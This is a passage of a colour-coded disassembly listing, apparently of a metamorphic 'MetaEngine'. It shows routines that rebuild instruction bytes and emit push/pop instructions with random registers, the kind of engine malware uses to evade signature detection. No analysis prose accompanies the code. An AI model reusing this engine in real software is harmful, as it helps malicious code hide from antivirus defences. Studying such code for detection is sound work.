</span>                <span style="COLOR: #c0c0c0">mov     ah</span><span style="COLOR: #c0c0c0">, bl</span>                    <span style="COLOR: white">; ah = random reg
</span>                <span style="COLOR: #c0c0c0">rol     ah</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">3</span>                     <span style="COLOR: white">; place it in the [reg/opcode] field
</span>                <span style="COLOR: #c0c0c0">add     al</span><span style="COLOR: #c0c0c0">, ah</span>                    <span style="COLOR: white">; add to ModRM byte
</span>                <span style="COLOR: #c0c0c0">stosb                             </span><span style="COLOR: white">; store
</span>                <span style="COLOR: #c0c0c0">call    </span><span style="COLOR: #ffff00">CheckDisplacement</span>         <span style="COLOR: #c0c0c0">; returns cl: 0, 1 or 4
</span>                <span style="COLOR: #c0c0c0">add     esi</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">2</span>                    <span style="COLOR: white">; increase code pointer by 2
</span>                <span style="COLOR: #c0c0c0">rep movsb                         </span><span style="COLOR: white">; copy displacement
</span>                <span style="COLOR: #c0c0c0">add     esi</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">1</span>                    <span style="COLOR: white">; increase code pointer
</span>                <span style="COLOR: #c0c0c0">cmp     dl</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">0</span>                     <span style="COLOR: white">; check w bit
</span>                <span style="COLOR: #c0c0c0">jz      short </span><span style="COLOR: #ffff00">Wrap_Morph4</span>
                <span style="COLOR: #c0c0c0">add     esi</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">3</span>                    <span style="COLOR: white">; increase code pointer by 3
</span>
<span style="COLOR: #ffff00">Wrap_Morph4</span><span style="COLOR: #c0c0c0">:                                      </span><span style="COLOR: #00ff00">; CODE XREF: MetaEngine+828j
</span>                <span style="COLOR: #c0c0c0">call    </span><span style="COLOR: #ffff00">MakePopRandomReg</span>          <span style="COLOR: #c0c0c0">; store (bl &amp; dh) + 58h
</span>                <span style="COLOR: #c0c0c0">jmp     </span><span style="COLOR: #ffff00">LoadInstruction</span>
<span style="COLOR: #c0c0c0">; END OF FUNCTION CHUNK FOR MetaEngine
</span>
<span style="COLOR: #c0c0c0">; _______________ S U B R O U T I N E _______________________________________
</span>
<span style="COLOR: white">; store (bl &amp; dh) + 50h
</span>
<span style="COLOR: #ffff00">MakePushRandomReg proc near                       </span><span style="COLOR: #00ff00">; CODE XREF: MetaEngine+738p
</span>                                                  <span style="COLOR: #00ff00">; MetaEngine+77Fp ...
</span>                <span style="COLOR: #c0c0c0">mov     al</span><span style="COLOR: #c0c0c0">, bl</span>
                <span style="COLOR: #c0c0c0">and     al</span><span style="COLOR: #c0c0c0">, dh</span>
                <span style="COLOR: #c0c0c0">add     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">50h</span>
                <span style="COLOR: #c0c0c0">stosb
</span>                <span style="COLOR: #c0c0c0">retn
</span><span style="COLOR: #ffff00">MakePushRandomReg endp
</span>

<span style="COLOR: #c0c0c0">; _______________ S U B R O U T I N E _______________________________________
</span>
<span style="COLOR: white">; store (bl &amp; dh) + 58h
</span>
<span style="COLOR: #ffff00">MakePopRandomReg proc near                        </span><span style="COLOR: #00ff00">; CODE XREF: MetaEngine+76Ep
</span>                                                  <span style="COLOR: #00ff00">; MetaEngine:Wrap_Morph3p ...
</span>                <span style="COLOR: #c0c0c0">mov     al</span><span style="COLOR: #c0c0c0">, bl</span>
                <span style="COLOR: #c0c0c0">and     al</span><span style="COLOR: #c0c0c0">, dh</span>
                <span style="COLOR: #c0c0c0">add     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">58h</span>
                <span style="COLOR: #c0c0c0">stosb
</span>                <span style="COLOR: #c0c0c0">retn
</span><span style="COLOR: #ffff00">MakePopRandomReg endp
</span>
</pre></span>
</body></html>